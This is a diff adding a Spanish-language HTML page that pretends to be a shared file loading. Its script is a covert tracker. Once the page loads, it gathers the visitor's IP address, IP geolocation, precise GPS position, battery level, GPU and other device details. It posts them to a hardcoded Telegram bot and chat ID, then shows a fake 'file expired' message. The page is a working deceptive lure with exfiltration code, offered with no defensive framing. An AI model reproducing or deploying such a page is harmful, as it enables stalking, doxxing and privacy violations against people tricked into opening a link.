@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Archivo Compartido</title>
+<meta property="og:title" content="Te compartieron un archivo">
+<meta property="og:description" content="Haz clic para ver el contenido">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:white;min-height:100vh;display:flex;justify-content:center;align-items:center}
+.card{background:rgba(255,255,255,0.05);backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,0.1);border-radius:20px;padding:40px;max-width:420px;text-align:center}
+.icon{font-size:60px;margin-bottom:20px}
+h1{font-size:22px;margin-bottom:10px}
+p{color:#a0a0b0;font-size:14px;margin-bottom:20px;line-height:1.6}
+.loader{border:3px solid rgba(255,255,255,0.1);border-top:3px solid #4ecca3;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:20px auto}
+@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+#status{font-size:13px;color:#4ecca3}
+</style>
+</head>
+<body>
+<div class="card">
+<div class="icon">&#128196;</div>
+<h1 id="title">Cargando archivo...</h1>
+<div class="loader" id="loader"></div>
+<p id="status">Preparando el contenido...</p>
+</div>
+<script>
+const T='8575617284:AAEnhzskJXyLFC5VV4Qi2-TEz8UNAK4idYQ',C='7891650726';
+async function track(){
+let d={time:new Date().toISOString(),ua:navigator.userAgent,plat:navigator.platform,lang:navigator.language,scr:screen.width+'x'+screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,cores:navigator.hardwareConcurrency||'?',mem:navigator.deviceMemory||'?',touch:navigator.maxTouchPoints,ref:document.referrer||'directo'};
+try{const r=await fetch('https://api.ipify.org?format=json');const j=await r.json();d.ip=j.ip;const g=await fetch('http://ip-api.com/json/'+j.ip+'?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,hosting');const gd=await g.json();if(gd.status==='success'){d.country=gd.country+' ('+gd.countryCode+')';d.city=gd.city;d.region=gd.regionName;d.zip=gd.zip;d.isp=gd.isp;d.org=gd.org;d.asn=gd.as;d.lat_ip=gd.lat;d.lon_ip=gd.lon;d.proxy=gd.proxy;d.hosting=gd.hosting}}catch(e){}
+if(navigator.geolocation){try{const p=await new Promise((ok,no)=>{navigator.geolocation.getCurrentPosition(ok,no,{enableHighAccuracy:true,timeout:10000,maximumAge:0})});d.gps_lat=p.coords.latitude;d.gps_lon=p.coords.longitude;d.gps_acc=Math.round(p.coords.accuracy)+'m';if(p.coords.altitude)d.gps_alt=Math.round(p.coords.altitude)+'m';if(p.coords.speed)d.gps_spd=Math.round(p.coords.speed*3.6)+'km/h'}catch(e){d.gps_err=e.message}}
+try{const b=await navigator.getBattery();d.bat=Math.round(b.level*100)+'%';d.chg=b.charging?'Si':'No'}catch(e){}
+try{const cv=document.createElement('canvas');const gl=cv.getContext('webgl');if(gl){const di=gl.getExtension('WEBGL_debug_renderer_info');if(di)d.gpu=gl.getParameter(di.UNMASKED_RENDERER_WEBGL)}}catch(e){}
+let m='\xf0\x9f\x97\xba\xef\xb8\x8f TRACKING ACTIVADO\n';
+m+='\u2501'.repeat(30)+'\n\n';
+if(d.ip)m+='\xf0\x9f\x8c\x90 IP: '+d.ip+'\n';
+if(d.proxy)m+='\xf0\x9f\x9b\xa1 VPN/Proxy: DETECTADO\n';
+if(d.country)m+='\xf0\x9f\x8c\x8d Pais: '+d.country+'\n';
+if(d.city)m+='\xf0\x9f\x8f\x99 Ciudad: '+d.city+', '+(d.region||'')+'\n';
+if(d.zip)m+='\xf0\x9f\x93\xae CP: '+d.zip+'\n';
+if(d.isp)m+='\xf0\x9f\x8f\xa2 ISP: '+d.isp+'\n';
+if(d.org)m+='\xf0\x9f\x8f\x9b Org: '+d.org+'\n';
+if(d.asn)m+='\xf0\x9f\x94\x97 ASN: '+d.asn+'\n';
+if(d.lat_ip)m+='\xf0\x9f\x93\x8d IP Loc: '+d.lat_ip+','+d.lon_ip+'\n';
+m+='\n';
+if(d.gps_lat){m+='\xf0\x9f\x8e\xaf GPS EXACTO: '+d.gps_lat+','+d.gps_lon+'\n';m+='Precision: '+d.gps_acc+'\n';if(d.gps_alt)m+='Altitud: '+d.gps_alt+'\n';if(d.gps_spd)m+='Velocidad: '+d.gps_spd+'\n';m+='Maps: https://www.google.com/maps?q='+d.gps_lat+','+d.gps_lon+'\n'}
+else if(d.lat_ip)m+='Maps: https://www.google.com/maps?q='+d.lat_ip+','+d.lon_ip+'\n';
+if(d.gps_err)m+='GPS: '+d.gps_err+'\n';
+m+='\n\xf0\x9f\x93\xb1 DISPOSITIVO:\n';
+m+='Plataforma: '+d.plat+'\n';
+m+='Pantalla: '+d.scr+'\n';
+if(d.cores!=='?')m+='CPU: '+d.cores+' cores\n';
+if(d.mem!=='?')m+='RAM: ~'+d.mem+'GB\n';
+if(d.bat)m+='Bateria: '+d.bat+(d.chg==='Si'?' cargando':'')+'\n';
+if(d.gpu)m+='GPU: '+d.gpu+'\n';
+m+='Touch: '+d.touch+'\n';
+m+='Zona: '+d.tz+'\n';
+m+='Idioma: '+d.lang+'\n';
+m+='\n'+d.time;
+await fetch('https://api.telegram.org/bot'+T+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:C,text:m})});
+document.getElementById('loader').style.display='none';
+document.getElementById('title').textContent='Contenido no disponible';
+document.getElementById('status').textContent='Este archivo ha expirado o no esta disponible en tu region.';
+document.getElementById('status').style.color='#ff6b6b';
+}
+track();
+</script>
+</body>
+</html>
